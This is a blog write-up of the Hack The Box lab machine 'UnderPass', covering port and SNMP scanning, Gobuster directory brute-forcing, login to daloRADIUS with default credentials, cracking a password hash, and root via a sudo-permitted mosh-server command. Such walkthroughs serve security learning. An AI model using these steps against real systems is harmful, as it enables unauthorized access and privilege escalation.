---
title: "UnderPass(Easy) | Hack the Box"  # Post title
date: 2025-08-12           # Must match filename date
categories: [Hack the box Writeups]         # Optional (max 2)
tags: [htb, linux]     # Optional (max 5-10)
author:               # Defaults to your config name
---

# HackTheBox — UnderPass Write-Up

## Recon

I started with a quick TCP scan using **RustScan** to identify open ports:


```shell
sudo rustscan -a 10.10.11.48
```

Only **two** TCP ports were open. They didn’t reveal anything interesting, so I moved to a **UDP** scan to look for additional services:

```shell
sudo nmap -sU 10.10.11.48 -T4
```

The scan revealed UDP port **161 (SNMP)**. The service banner also disclosed the hostname:

```shell
UnDerPass.htb
```

## SNMP Enumeration

Using snmpwalk, I enumerated the SNMP service:

```shell
snmpwalk -v 2c -c public 10.10.11.48
```

This revealed the presence of a **daloRADIUS server**.


## HTTP Enumeration

Accessing the daloRADIUS endpoint returned a **403** Forbidden.

I decided to brute-force directories under /daloradius using Gobuster:

```shell
sudo gobuster dir -u http://10.10.11.48/daloradius \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

The **app** directory looked interesting, so I enumerated it further:

```shell
sudo gobuster dir -u http://10.10.11.48/daloradius/app \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

Inside **/app**, I found **users** and **operators** directories. Proceeded to explore futhur


## Credential Hunting

Visiting **/users** showed a login page:

Searching online for default daloRADIUS credentials gave:

`administrator: radius`

However, these didn’t work for /users. I moved to the **/operators**  directory and repeated enumeration:

```shell
sudo gobuster dir -u http://10.10.11.48/daloradius/app/operators \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php
```

The /operators directory also had a **login page** which included a version number, and for that version, the same default credentials were listed online:

`administrator: radius`

This time, they worked.I was successfully logged in.


## Looting User Data

Inside the dashboard, I found a user list:

One entry contained a password hash:

I cracked it using CrackStation and retrieved the plaintext password:



## Initial Shell

With SSH open, I tried the credentials and logged in successfully--Got the user flag


## Privilege Escalation

Checking sudo permissions:

```shell
sudo -l
```
It allowed running mosh-server with sudo. Did some research online and found this [article]

and came up with this payload:

```shell
mosh --server="sudo /usr/bin/mosh-server" localhost
```

What This Does

    mosh: A mobile shell client for responsive, persistent terminal sessions.

    --server="sudo /usr/bin/mosh-server": Runs the mosh server with root privileges.

    localhost: Connects back to the local machine.

This escalated my privileges, and I obtained root access:

Summary

    Initial Access: SNMP enumeration → daloRADIUS default credentials

    User Shell: Cracked password hash from operator dashboard → SSH login

    Privilege Escalation: Sudo permissions abuse with mosh-server

✅ Rooted!